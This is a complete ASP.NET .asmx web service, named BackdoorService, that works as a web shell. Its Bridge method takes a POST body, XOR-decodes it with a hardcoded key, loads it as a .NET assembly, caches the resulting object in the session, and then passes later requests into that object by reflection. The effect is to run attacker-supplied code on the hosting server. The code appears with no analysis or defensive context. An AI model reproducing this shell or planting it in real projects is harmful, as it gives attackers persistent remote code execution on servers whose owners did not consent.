<%@ WebService Language="C#" Class="BackdoorService" %>

using System;
using System.Web;
using System.Web.Services;
using System.Reflection;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class BackdoorService : System.Web.Services.WebService
{
    [WebMethod(EnableSession = true)]
    public void Bridge()
    {
        HttpContext context = HttpContext.Current;
        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        if (request.HttpMethod == "POST")
        {
            try
            {
                int totalBytes = request.TotalBytes;
                if (totalBytes <= 0)
                    return;

                byte[] rawData = request.BinaryRead(totalBytes);
                object loader = Session["nebulapulsar"];

                if (loader == null)
                {
                    byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes("NBPULSARDEADBEEF");
                    for (int i = 0; i < rawData.Length; i++)
                        rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                    Assembly asm = Assembly.Load(rawData);
                    loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                    Session["nebulapulsar"] = loader;
                    response.Write("LOADER_INIT_SUCCESS");
                }
                else
                {
                    context.Items["rawPostData"] = rawData;
                    loader.GetType().GetMethod("Equals", new Type[]{typeof(object)}).Invoke(loader, new object[]{context});
                }
            }
            catch (Exception ex)
            {
                response.Write("ASMX_PORT_ERROR: " + ex.Message);
            }
            
            context.ApplicationInstance.CompleteRequest();
        }
    }
}